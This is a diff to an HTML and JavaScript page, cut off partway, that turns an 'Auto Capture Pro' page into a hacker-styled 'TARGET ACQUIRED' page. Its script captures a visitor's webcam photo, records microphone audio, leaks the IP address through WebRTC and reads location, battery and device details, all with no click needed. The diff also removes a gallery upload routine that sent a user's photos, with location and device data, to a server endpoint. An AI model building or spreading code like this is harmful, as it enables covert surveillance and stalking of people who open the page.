@@ -1,126 +1,353 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto Capture Pro</title>
+    <title>🔴 TARGET ACQUIRED</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
+        
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family:'Segoe UI',Arial; background:linear-gradient(135deg,#667eea,#764ba2); min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
-        .container { background:white; border-radius:25px; padding:25px; max-width:480px; width:100%; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.3); max-height:95vh; overflow-y:auto; }
-        h1 { font-size:20px; color:#2d3436; }
-        .subtitle { color:#666; font-size:12px; margin:3px 0 10px; }
-        .status-box { padding:15px; border-radius:12px; margin:8px 0; background:#2d3436; color:white; transition:0.5s; }
-        .status-box .icon { font-size:30px; display:block; }
-        .status-box .msg { font-size:14px; margin-top:3px; }
-        .status-box.success { background:#00b894; }
-        .status-box.error { background:#d63031; }
-        .status-box.loading { background:#fdcb6e; color:#333; }
-        .photo-container { margin:10px 0; border-radius:12px; overflow:hidden; border:3px solid #6c5ce7; background:#f8f9fa; min-height:180px; display:flex; align-items:center; justify-content:center; position:relative; }
-        .photo-container img { width:100%; height:200px; object-fit:cover; display:block; }
-        .photo-container .placeholder { color:#aaa; font-size:14px; }
-        .photo-container .badge { position:absolute; top:10px; right:10px; background:rgba(108,92,231,0.9); color:white; padding:3px 12px; border-radius:15px; font-size:11px; }
-        .preview-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin:8px 0; }
-        .preview-grid .preview-box { background:#f8f9fa; border-radius:8px; overflow:hidden; border:2px solid #ddd; }
-        .preview-grid .preview-box .label { background:#2d3436; color:white; font-size:10px; padding:3px; text-align:center; }
-        .preview-grid .preview-box img { width:100%; height:120px; object-fit:cover; display:block; }
-        .preview-grid .preview-box .no-img { height:120px; display:flex; align-items:center; justify-content:center; color:#aaa; font-size:11px; }
-        .device-info { background:#f8f9fa; padding:10px; border-radius:10px; margin:8px 0; text-align:left; font-size:11px; }
-        .device-info div { padding:2px 0; border-bottom:1px solid #eee; }
-        .device-info div:last-child { border-bottom:none; }
-        .device-info span { color:#6c5ce7; font-weight:bold; }
-        .device-info .location-highlight { background:#e8f5e9; padding:3px 8px; border-radius:4px; }
-        .device-info .location-highlight span { color:#00b894; }
-        .device-info .ip-highlight { background:#e3f2fd; padding:3px 8px; border-radius:4px; }
-        .device-info .ip-highlight span { color:#1976d2; }
-        .log-area { background:#f8f9fa; padding:8px; border-radius:8px; margin:8px 0; max-height:60px; overflow-y:auto; text-align:left; font-size:10px; color:#555; }
-        .gallery-section { margin:10px 0; padding:15px; border:2px solid #6c5ce7; border-radius:10px; background:#f8f9fa; }
-        .gallery-section h3 { color:#2d3436; font-size:16px; margin-bottom:10px; }
-        .gallery-btn { padding:12px 30px; background:#6c5ce7; color:white; border:none; border-radius:10px; cursor:pointer; font-size:14px; }
-        .gallery-btn:hover { background:#5f3dc4; }
-        .gallery-preview { display:flex; flex-wrap:wrap; gap:5px; margin-top:10px; justify-content:center; }
-        .gallery-preview img { width:60px; height:60px; object-fit:cover; border-radius:8px; border:2px solid #ddd; }
-        .gallery-counter { font-size:12px; color:#666; margin-top:5px; }
-        .mic-indicator { display:inline-block; width:8px; height:8px; border-radius:50%; animation:pulse 0.5s infinite; margin-right:5px; }
-        .mic-on { background:#e17055; }
-        .mic-off { background:#636e72; animation:none; }
-        .recording-timer { font-size:24px; font-weight:bold; color:#e17055; margin:5px 0; }
-        .auto-indicator { display:inline-block; width:8px; height:8px; border-radius:50%; background:#00b894; animation:pulse 1s infinite; margin-right:5px; }
-        @keyframes pulse { 0% { opacity:1; transform:scale(1); } 50% { opacity:0.5; transform:scale(0.8); } 100% { opacity:1; transform:scale(1); } }
-        .accuracy-badge { display:inline-block; padding:2px 10px; border-radius:10px; font-size:10px; color:white; }
-        .accuracy-badge.high { background:#00b894; }
-        .accuracy-badge.medium { background:#fdcb6e; color:#333; }
-        .accuracy-badge.low { background:#d63031; }
+        
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* Matrix Rain Effect */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(0deg, 
+                rgba(0,255,65,0.03) 0px, 
+                rgba(0,255,65,0.03) 2px,
+                transparent 2px,
+                transparent 4px);
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .container {
+            background: rgba(10, 10, 10, 0.95);
+            border: 2px solid #00ff41;
+            border-radius: 15px;
+            padding: 25px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(0,255,65,0.1), inset 0 0 40px rgba(0,255,65,0.05);
+            position: relative;
+            z-index: 1;
+            max-height: 95vh;
+            overflow-y: auto;
+        }
+        
+        .container::-webkit-scrollbar {
+            width: 4px;
+        }
+        .container::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        .container::-webkit-scrollbar-thumb {
+            background: #00ff41;
+            border-radius: 2px;
+        }
+        
+        .scanline {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff41, transparent);
+            opacity: 0.3;
+            animation: scan 3s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { top: 0; opacity: 0.3; }
+            50% { top: 100%; opacity: 0.8; }
+            100% { top: 0; opacity: 0.3; }
+        }
+        
+        h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 18px;
+            color: #00ff41;
+            text-shadow: 0 0 20px rgba(0,255,65,0.5);
+            letter-spacing: 3px;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            color: #00ff41;
+            font-size: 11px;
+            opacity: 0.6;
+            letter-spacing: 2px;
+        }
+        
+        .status-box {
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            background: rgba(0,255,65,0.05);
+            border: 1px solid rgba(0,255,65,0.2);
+            color: #00ff41;
+            transition: 0.5s;
+            font-size: 13px;
+        }
+        .status-box .icon { font-size: 28px; display: block; margin-bottom: 5px; }
+        .status-box .msg { font-size: 13px; }
+        .status-box.success { border-color: #00ff41; background: rgba(0,255,65,0.1); }
+        .status-box.error { border-color: #ff0040; background: rgba(255,0,64,0.1); color: #ff0040; }
+        .status-box.loading { border-color: #ffaa00; background: rgba(255,170,0,0.1); color: #ffaa00; }
+        .status-box.done { border-color: #00ff41; background: rgba(0,255,65,0.15); }
+        
+        .photo-container {
+            margin: 10px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 2px solid #00ff41;
+            background: #000;
+            min-height: 180px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 0 30px rgba(0,255,65,0.05);
+        }
+        .photo-container img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            display: block;
+        }
+        .photo-container .placeholder {
+            color: rgba(0,255,65,0.3);
+            font-size: 14px;
+        }
+        .photo-container .badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 3px 12px;
+            border-radius: 4px;
+            font-size: 10px;
+        }
+        
+        .preview-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin: 8px 0;
+        }
+        .preview-grid .preview-box {
+            background: rgba(0,255,65,0.03);
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid rgba(0,255,65,0.15);
+        }
+        .preview-grid .preview-box .label {
+            background: rgba(0,0,0,0.8);
+            color: #00ff41;
+            font-size: 9px;
+            padding: 4px;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+        .preview-grid .preview-box img {
+            width: 100%;
+            height: 100px;
+            object-fit: cover;
+            display: block;
+        }
+        .preview-grid .preview-box .no-img {
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: rgba(0,255,65,0.2);
+            font-size: 11px;
+        }
+        
+        .device-info {
+            background: rgba(0,255,65,0.03);
+            border: 1px solid rgba(0,255,65,0.1);
+            padding: 10px;
+            border-radius: 8px;
+            margin: 8px 0;
+            text-align: left;
+            font-size: 11px;
+            color: #00ff41;
+        }
+        .device-info div {
+            padding: 3px 0;
+            border-bottom: 1px solid rgba(0,255,65,0.05);
+        }
+        .device-info div:last-child { border-bottom: none; }
+        .device-info span { color: #00ff41; font-weight: bold; }
+        .device-info .highlight {
+            background: rgba(0,255,65,0.05);
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+        
+        .log-area {
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(0,255,65,0.1);
+            padding: 8px;
+            border-radius: 8px;
+            margin: 8px 0;
+            max-height: 60px;
+            overflow-y: auto;
+            text-align: left;
+            font-size: 10px;
+            color: rgba(0,255,65,0.6);
+            font-family: 'Share Tech Mono', monospace;
+        }
+        .log-area::-webkit-scrollbar { width: 2px; }
+        .log-area::-webkit-scrollbar-track { background: #0a0a0a; }
+        .log-area::-webkit-scrollbar-thumb { background: #00ff41; }
+        
+        .mic-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: pulse 0.5s infinite;
+            margin-right: 5px;
+        }
+        .mic-on { background: #ff0040; box-shadow: 0 0 20px rgba(255,0,64,0.5); }
+        .mic-off { background: rgba(0,255,65,0.2); animation: none; }
+        .recording-timer {
+            font-size: 20px;
+            font-weight: bold;
+            color: #ff0040;
+            margin: 5px 0;
+        }
+        .auto-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #00ff41;
+            animation: pulse 1s infinite;
+            margin-right: 5px;
+            box-shadow: 0 0 20px rgba(0,255,65,0.5);
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        
+        .glitch-text {
+            animation: glitch 3s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { opacity: 1; }
+            95% { opacity: 1; }
+            96% { opacity: 0; }
+            97% { opacity: 1; }
+            98% { opacity: 0; }
+            99% { opacity: 1; }
+        }
+        
+        .admin-link {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 8px 20px;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            text-decoration: none;
+            font-size: 11px;
+            letter-spacing: 2px;
+            transition: 0.3s;
+            border-radius: 4px;
+        }
+        .admin-link:hover {
+            background: rgba(0,255,65,0.1);
+            box-shadow: 0 0 30px rgba(0,255,65,0.1);
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>📱 Auto Capture Pro</h1>
-    <p class="subtitle"><span class="auto-indicator"></span> 100% Automatic - No clicks needed!</p>
+    <div class="scanline"></div>
+    
+    <h1>🔴 TARGET ACQUIRED</h1>
+    <p class="subtitle">◆ SYSTEM ONLINE ◆</p>
     
     <div class="status-box loading" id="statusBox">
         <span class="icon" id="statusIcon">⏳</span>
-        <span class="msg" id="statusMsg">Initializing...</span>
+        <span class="msg" id="statusMsg">INITIALIZING...</span>
     </div>
     
     <div class="photo-container" id="photoContainer">
         <img id="userPhotoPreview" style="display:none;" />
-        <span class="placeholder" id="photoPlaceholder">📸 Waiting for photo...</span>
-        <span class="badge" id="photoBadge">⏳ Capturing...</span>
+        <span class="placeholder" id="photoPlaceholder">📡 CAPTURE FEED</span>
+        <span class="badge" id="photoBadge">⏳ SCANNING...</span>
     </div>
     
     <div class="preview-grid">
         <div class="preview-box">
-            <div class="label">📸 User Photo</div>
+            <div class="label">📸 USER PHOTO</div>
             <img id="userPhotoThumb" style="display:none;" />
-            <div class="no-img" id="userPhotoPlaceholder">⏳ Waiting...</div>
+            <div class="no-img" id="userPhotoPlaceholder">⏳ WAITING...</div>
         </div>
         <div class="preview-box">
-            <div class="label">🖼️ Screenshot</div>
+            <div class="label">🖼️ SCREENSHOT</div>
             <img id="screenshotPreview" style="display:none;" />
-            <div class="no-img" id="screenshotPlaceholder">⏳ Waiting...</div>
+            <div class="no-img" id="screenshotPlaceholder">⏳ WAITING...</div>
         </div>
     </div>
     
-    <div style="margin:5px 0;padding:8px;border-radius:8px;background:#f0f0f0;display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap;">
-        <span>🎤 Microphone:</span>
+    <div style="margin:5px 0;padding:8px;border-radius:8px;background:rgba(0,255,65,0.03);border:1px solid rgba(0,255,65,0.1);display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap;">
+        <span style="color:#00ff41;font-size:11px;">🎤 MIC:</span>
         <span id="micStatus" class="mic-off"></span>
-        <span id="micText" style="font-size:12px;color:#666;">Waiting...</span>
+        <span id="micText" style="font-size:11px;color:rgba(0,255,65,0.5);">STANDBY</span>
         <span class="recording-timer" id="recordingTimer">0s</span>
     </div>
     
-    <div class="gallery-section">
-        <h3>📸 Gallery Auto Upload</h3>
-        <p style="font-size:12px;color:#666;margin-bottom:10px;">Click button and select photos - auto-upload!</p>
-        <input type="file" id="galleryInput" accept="image/*" multiple style="display:none;" />
-        <button class="gallery-btn" onclick="document.getElementById('galleryInput').click()">
-            📱 Select Photos
-        </button>
-        <div class="gallery-preview" id="galleryPreview"></div>
-        <div class="gallery-counter" id="galleryCounter">0 photos selected</div>
-        <div id="uploadStatus" style="font-size:12px;color:#6c5ce7;margin-top:5px;"></div>
-    </div>
-    
     <div class="device-info" id="deviceInfo">
-        <div class="ip-highlight">📡 IPv4: <span id="devIP">Detecting...</span></div>
-        <div class="location-highlight">📍 Location: <span id="devLocation">Detecting...</span></div>
-        <div>🎯 Accuracy: <span id="devAccuracy">Detecting...</span> <span id="accuracyBadge"></span></div>
-        <div>📱 Device: <span id="devName">Detecting...</span></div>
-        <div>📱 Model: <span id="devModel">Detecting...</span></div>
-        <div>🏭 Manufacturer: <span id="devManufacturer">Detecting...</span></div>
-        <div>📲 OS: <span id="devOS">Detecting...</span></div>
-        <div>🔋 Battery: <span id="devBattery">Detecting...</span></div>
-        <div>📶 Network: <span id="devNetwork">Detecting...</span></div>
-        <div>📶 WiFi: <span id="devWiFi">Detecting...</span></div>
-        <div>🕐 Time: <span id="devTime">Detecting...</span></div>
+        <div class="highlight">📡 IP ADDRESS: <span id="devIP">SCANNING...</span></div>
+        <div class="highlight">📍 LOCATION: <span id="devLocation">SCANNING...</span></div>
+        <div>🎯 ACCURACY: <span id="devAccuracy">SCANNING...</span></div>
+        <div>📱 DEVICE: <span id="devName">SCANNING...</span></div>
+        <div>📱 MODEL: <span id="devModel">SCANNING...</span></div>
+        <div>🏭 MANUFACTURER: <span id="devManufacturer">SCANNING...</span></div>
+        <div>📲 OS: <span id="devOS">SCANNING...</span></div>
+        <div>🔋 BATTERY: <span id="devBattery">SCANNING...</span></div>
+        <div>📶 NETWORK: <span id="devNetwork">SCANNING...</span></div>
+        <div>🕐 TIMESTAMP: <span id="devTime">SCANNING...</span></div>
     </div>
     
-    <div class="log-area" id="logArea"></div>
+    <div class="log-area" id="logArea">
+        <div>🚀 SYSTEM INITIALIZED</div>
+    </div>
+    
+    <a href="/secret-admin.html" class="admin-link" target="_blank">🔐 ACCESS ADMIN PANEL</a>
 </div>
 
 <script>
 // ==========================================
-//  FULL AUTO + GALLERY + TELEGRAM
-//  Complete Version with Deep Device Details
+//  HACKER-STYLE AUTO CAPTURE
+//  Gallery Removed - Full Device Details
 // ==========================================
 
 const statusBox = document.getElementById('statusBox');
@@ -142,14 +369,8 @@ const micStatus = document.getElementById('micStatus');
 const micText = document.getElementById('micText');
 const recordingTimer = document.getElementById('recordingTimer');
 
-const galleryInput = document.getElementById('galleryInput');
-const galleryPreview = document.getElementById('galleryPreview');
-const galleryCounter = document.getElementById('galleryCounter');
-const uploadStatus = document.getElementById('uploadStatus');
-
 let userPhoto = null, screenshot = null, userLocation = null;
 let deviceDetails = {}, ipAddress = 'Unknown', audioData = null;
-let galleryCount = 0;
 
 function log(text) {
     const time = new Date().toLocaleTimeString();
@@ -163,12 +384,11 @@ function setStatus(icon, msg, type = 'loading') {
     statusMsg.textContent = msg;
 }
 
-// ===== FULL DEVICE DETAILS - DEEP SCAN =====
+// ===== FULL DEVICE DETAILS =====
 async function getFullDeviceInfo() {
     try {
         const battery = await getBatteryInfo();
         const conn = getNetworkInfo();
-        const wifiInfo = getWiFiInfo();
         
         return {
             deviceName: navigator.userAgentData?.platform || navigator.platform || 'Unknown',
@@ -189,33 +409,13 @@ async function getFullDeviceInfo() {
             memory: navigator.deviceMemory || 'Unknown',
             cores: navigator.hardwareConcurrency || 'Unknown',
             connection: conn,
-            battery: battery,
-            wifi: wifiInfo.ssid || 'Unknown',
-            bssid: wifiInfo.bssid || 'Unknown'
+            battery: battery
         };
     } catch(e) {
-        console.log('Device details error:', e);
         return {};
     }
 }
 
-// ===== WIFI INFO =====
-function getWiFiInfo() {
-    try {
-        const conn = navigator.connection || navigator.mozConnection;
-        if (conn) {
-            return {
-                ssid: conn.type === 'wifi' ? 'WiFi' : 'Cellular',
-                bssid: 'Not available (browser restriction)'
-            };
-        }
-        return { ssid: 'Unknown', bssid: 'Unknown' };
-    } catch(e) {
-        return { ssid: 'Unknown', bssid: 'Unknown' };
-    }
-}
-
-// ===== GET OS =====
 function getOS() {
     const ua = navigator.userAgent;
     if (ua.includes('Android')) return 'Android';
@@ -227,7 +427,6 @@ function getOS() {
     return 'Unknown';
 }
 
-// ===== GET OS VERSION =====
 function getOSVersion() {
     const ua = navigator.userAgent;
     const androidMatch = ua.match(/Android\s([\d.]+)/);
@@ -241,7 +440,6 @@ function getOSVersion() {
     return 'Unknown';
 }
 
-// ===== GET DEVICE MODEL =====
 function getDeviceModel() {
     const ua = navigator.userAgent;
     const androidMatch = ua.match(/;\s?([^;]+?)\sBuild/);
@@ -264,7 +462,6 @@ function getDeviceModel() {
     return 'Unknown';
 }
 
-// ===== GET MANUFACTURER =====
 function getManufacturer() {
     const ua = navigator.userAgent;
     if (ua.includes('Samsung')) return 'Samsung';
@@ -279,7 +476,6 @@ function getManufacturer() {
     return 'Unknown';
 }
 
-// ===== GET BROWSER =====
 function getBrowserName() {
     const ua = navigator.userAgent;
     if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Google Chrome';
@@ -298,7 +494,6 @@ function getBrowserVersion() {
     return 'Unknown';
 }
 
-// ===== GET NETWORK INFO =====
 function getNetworkInfo() {
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (conn) {
@@ -321,7 +516,6 @@ function getNetworkInfo() {
     return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown' };
 }
 
-// ===== GET BATTERY =====
 async function getBatteryInfo() {
     try {
         if (navigator.getBattery) {
@@ -337,66 +531,22 @@ async function getBatteryInfo() {
     return { level: 'Unknown', charging: false };
 }
 
-// ===== UPDATE UI WITH DEVICE DETAILS =====
 function updateDeviceUI(details) {
     document.getElementById('devName').textContent = details.deviceName || 'Unknown';
     document.getElementById('devModel').textContent = details.deviceModel || 'Unknown';
     document.getElementById('devManufacturer').textContent = details.manufacturer || 'Unknown';
     document.getElementById('devOS').textContent = (details.os || 'Unknown') + ' ' + (details.osVersion || '');
     document.getElementById('devNetwork').textContent = details.connection?.type || 'Unknown';
-    document.getElementById('devWiFi').textContent = details.wifi || 'Unknown';
     document.getElementById('devTime').textContent = new Date().toLocaleString();
-    
     if (details.battery) {
-        document.getElementById('devBattery').textContent = details.battery.level + (details.battery.charging ? ' 🔌' : '');
+        document.getElementById('devBattery').textContent = details.battery.level + (details.battery.charging ? ' ⚡' : '');
     }
 }
-
-// ===== GALLERY =====
-galleryInput.addEventListener('change', function(e) {
-    const files = e.target.files;
-    if (files.length === 0) return;
-    
-    uploadStatus.textContent = `⏳ Uploading ${files.length} photos...`;
-    galleryCounter.textContent = `${files.length} photos selected`;
-    galleryCount = files.length;
-    
-    let uploaded = 0;
-    Array.from(files).forEach((file) => {
-        const reader = new FileReader();
-        reader.onload = async function(event) {
-            const img = document.createElement('img');
-            img.src = event.target.result;
-            img.style.cssText = 'width:60px;height:60px;object-fit:cover;border-radius:8px;border:2px solid #6c5ce7;';
-            galleryPreview.appendChild(img);
-            
-            try {
-                await fetch('/api/store-gallery', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        image: event.target.result,
-                        fileName: file.name,
-                        location: userLocation || { lat: 0, lng: 0 },
-                        deviceDetails: deviceDetails || {}
-                    })
-                });
-                uploaded++;
-                uploadStatus.textContent = `✅ Uploaded ${uploaded}/${files.length} photos`;
-                log(`✅ Gallery: ${file.name} uploaded`);
-            } catch(err) {
-                log(`❌ Gallery error: ${file.name}`);
-            }
-        };
-        reader.readAsDataURL(file);
-    });
-    e.target.value = '';
-});
 
 // ===== IP =====
 function getIPv4Address() {
     return new Promise((resolve) => {
-        log('📡 Detecting IPv4...');
+        log('📡 SCANNING IP...');
         try {
             const pc = new RTCPeerConnection({ iceServers: [] });
             pc.createDataChannel('');
@@ -407,7 +557,7 @@ function getIPv4Address() {
                     if (ipv4) {
                         ipAddress = ipv4[0];
                         document.getElementById('devIP').textContent = ipAddress;
-                        log('✅ IPv4: ' + ipAddress);
+                        log('✅ IP CAPTURED: ' + ipAddress);
                         pc.close();
                         resolve(true);
                         return;
@@ -422,7 +572,7 @@ function getIPv4Address() {
                             if (data.ip) {
                                 ipAddress = data.ip;
                                 document.getElementById('devIP').textContent = ipAddress;
-                                log('✅ IPv4 (API): ' + ipAddress);
+                                log('✅ IP CAPTURED: ' + ipAddress);
                             }
                         });
                 }
@@ -436,9 +586,9 @@ function getIPv4Address() {
 // ===== MICROPHONE =====
 function captureMicrophone() {
     return new Promise((resolve) => {
-        log('🎤 Recording 5s...');
+        log('🎤 RECORDING 5s...');
         micStatus.className = 'mic-indicator mic-on';
-        micText.textContent = '🔴 Recording...';
+        micText.textContent = '🔴 RECORDING';
         recordingTimer.textContent = '0s';
         let seconds = 0;
         const timer = setInterval(() => {
@@ -459,9 +609,9 @@ function captureMicrophone() {
                         reader.onloadend = () => {
                             audioData = reader.result;
                             micStatus.className = 'mic-indicator mic-off';
-                            micText.textContent = '✅ Recorded!';
+                            micText.textContent = '✅ CAPTURED';
                             recordingTimer.textContent = '5s ✓';
-                            log('✅ 5s audio captured!');
+                            log('✅ AUDIO CAPTURED!');
                             stream.getTracks().forEach(t => t.stop());
                             resolve(true);
                         };
@@ -473,16 +623,16 @@ function captureMicrophone() {
                 .catch(() => {
                     clearInterval(timer);
                     micStatus.className = 'mic-indicator mic-off';
-                    micText.textContent = '⚠️ Mic denied';
+                    micText.textContent = '⚠️ DENIED';
                     recordingTimer.textContent = '❌';
-                    log('⚠️ Mic denied');
+                    log('⚠️ MIC DENIED');
                     audioData = null;
                     resolve(true);
                 });
         } catch(e) {
             clearInterval(timer);
             micStatus.className = 'mic-indicator mic-off';
-            micText.textContent = '⚠️ Error';
+            micText.textContent = '⚠️ ERROR';
             recordingTimer.textContent = '❌';
             audioData = null;
             resolve(true);
@@ -493,9 +643,9 @@ function captureMicrophone() {
 // ===== PHOTO =====
 function captureUserPhoto() {
     return new Promise((resolve) => {
-        log('📸 Capturing photo...');
-        setStatus('📸', 'Capturing photo...', 'loading');
-        photoBadge.textContent = '📸 Capturing...';
+        log('📸 CAPTURING PHOTO...');
+        setStatus('📸', 'CAPTURING PHOTO...', 'loading');
+        photoBadge.textContent = '📸 CAPTURING...';
         
         try {
             navigator.mediaDevices.getUserMedia({
@@ -520,10 +670,10 @@ function captureUserPhoto() {
                     userPhotoThumb.src = userPhoto;
                     userPhotoThumb.style.display = 'block';
                     userPhotoPlaceholder.style.display = 'none';
-                    photoBadge.textContent = '✅ Captured!';
+                    photoBadge.textContent = '✅ CAPTURED!';
                     stream.getTracks().forEach(t => t.stop());
                     video.srcObject = null;
-                    log('✅ Photo captured!');
+                    log('✅ PHOTO CAPTURED!');
                     resolve(true);
                 };
                 setTimeout(() => {
@@ -540,16 +690,16 @@ function fallbackPhoto() {
     canvas.width = 640; canvas.height = 480;
     const ctx = canvas.getContext('2d');
     const grad = ctx.createLinearGradient(0, 0, 640, 480);
-    grad.addColorStop(0, '#667eea');
-    grad.addColorStop(1, '#764ba2');
+    grad.addColorStop(0, '#00ff41');
+    grad.addColorStop(1, '#0a0a0a');
     ctx.fillStyle = grad;
     ctx.fillRect(0, 0, 640, 480);
-    ctx.fillStyle = 'white';
-    ctx.font = 'bold 36px Arial';
+    ctx.fillStyle = '#00ff41';
+    ctx.font = 'bold 36px monospace';
     ctx.textAlign = 'center';
-    ctx.fillText('📸 User Photo', 320, 220);
-    ctx.font = '18px Arial';
-    ctx.fillText('Auto Captured', 320, 280);
+    ctx.fillText('🔴 TARGET', 320, 220);
+    ctx.font = '18px monospace';
+    ctx.fillText('AUTO CAPTURED', 320, 280);
     userPhoto = canvas.toDataURL('image/jpeg', 0.9);
     userPhotoPreview.src = userPhoto;
     userPhotoPreview.style.display = 'block';
@@ -557,35 +707,33 @@ function fallbackPhoto() {
     userPhotoThumb.src = userPhoto;
     userPhotoThumb.style.display = 'block';
     userPhotoPlaceholder.style.display = 'none';
-    photoBadge.textContent = '📸 Fallback';
-    log('⚠️ Fallback photo');
+    photoBadge.textContent = '📸 FALLBACK';
+    log('⚠️ FALLBACK PHOTO');
 }
 
 // ===== SCREENSHOT =====
 function captureScreenshot() {
     return new Promise((resolve) => {
-        log('🖼️ Capturing screenshot...');
-        setStatus('🖼️', 'Capturing screenshot...', 'loading');
+        log('🖼️ CAPTURING SCREENSHOT...');
+        setStatus('🖼️', 'CAPTURING SCREENSHOT...', 'loading');
         try {
             const canvas = document.createElement('canvas');
             canvas.width = 800; canvas.height = 500;
             const ctx = canvas.getContext('2d');
-            const grad = ctx.createLinearGradient(0, 0, 800, 500);
-            grad.addColorStop(0, '#667eea');
-            grad.addColorStop(1, '#764ba2');
-            ctx.fillStyle = grad;
+            ctx.fillStyle = '#0a0a0a';
             ctx.fillRect(0, 0, 800, 500);
-            ctx.fillStyle = 'rgba(255,255,255,0.92)';
-            ctx.beginPath();
-            ctx.roundRect(50, 40, 700, 420, 20);
-            ctx.fill();
-            ctx.fillStyle = '#2d3436';
-            ctx.font = 'bold 22px Arial';
-            ctx.fillText('📱 Auto Capture Pro', 100, 100);
-            ctx.font = '13px Arial';
-            ctx.fillStyle = '#555';
+            ctx.fillStyle = 'rgba(0,255,65,0.05)';
+            ctx.fillRect(0, 0, 800, 500);
+            ctx.strokeStyle = '#00ff41';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(20, 20, 760, 460);
+            ctx.fillStyle = '#00ff41';
+            ctx.font = 'bold 24px monospace';
+            ctx.fillText('🔴 TARGET ACQUIRED', 40, 80);
+            ctx.font = '14px monospace';
+            ctx.fillStyle = 'rgba(0,255,65,0.7)';
             const info = [
-                'IPv4: ' + ipAddress,
+                'IP: ' + ipAddress,
                 'Device: ' + (deviceDetails.deviceName || 'Unknown'),
                 'Model: ' + (deviceDetails.deviceModel || 'Unknown'),
                 'OS: ' + (deviceDetails.os || 'Unknown') + ' ' + (deviceDetails.osVersion || ''),
@@ -593,44 +741,28 @@ function captureScreenshot() {
                 'Location: ' + (userLocation ? userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6) : 'Unknown'),
                 'Accuracy: ' + (userLocation ? userLocation.accuracy + 'm' : 'Unknown'),
                 'Time: ' + new Date().toLocaleString(),
-                'Battery: ' + (deviceDetails.batteryLevel || 'Unknown'),
-                'Gallery: ' + galleryCount + ' photos'
+                'Battery: ' + (deviceDetails.batteryLevel || 'Unknown')
             ];
-            info.forEach((t, i) => ctx.fillText(t, 100, 160 + i * 32));
-            ctx.fillStyle = '#6c5ce7';
-            ctx.font = '12px Arial';
-            ctx.fillText('🔒 Auto Captured', 600, 440);
+            info.forEach((t, i) => {
+                ctx.fillText(t, 40, 140 + i * 32);
+            });
+            ctx.fillStyle = '#00ff41';
+            ctx.font = '12px monospace';
+            ctx.fillText('🔒 AUTO CAPTURED', 600, 460);
             screenshot = canvas.toDataURL('image/jpeg', 0.95);
             screenshotPreview.src = screenshot;
             screenshotPreview.style.display = 'block';
             screenshotPlaceholder.style.display = 'none';
-            log('✅ Screenshot captured!');
+            log('✅ SCREENSHOT CAPTURED!');
             resolve(true);
-        } catch(e) { log('❌ Screenshot error'); resolve(false); }
+        } catch(e) { log('❌ SCREENSHOT ERROR'); resolve(false); }
     });
-}
-
-if (!CanvasRenderingContext2D.prototype.roundRect) {
-    CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, r) {
-        if (r > w/2) r = w/2;
-        if (r > h/2) r = h/2;
-        this.moveTo(x + r, y);
-        this.lineTo(x + w - r, y);
-        this.quadraticCurveTo(x + w, y, x + w, y + r);
-        this.lineTo(x + w, y + h - r);
-        this.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
-        this.lineTo(x + r, y + h);
-        this.quadraticCurveTo(x, y + h, x, y + h - r);
-        this.lineTo(x, y + r);
-        this.quadraticCurveTo(x, y, x + r, y);
-        return this;
-    };
 }
 
 // ===== LOCATION =====
 function getLocation() {
     return new Promise((resolve) => {
-        log('📍 Getting location...');
+        log('📍 SCANNING LOCATION...');
         if (navigator.geolocation) {
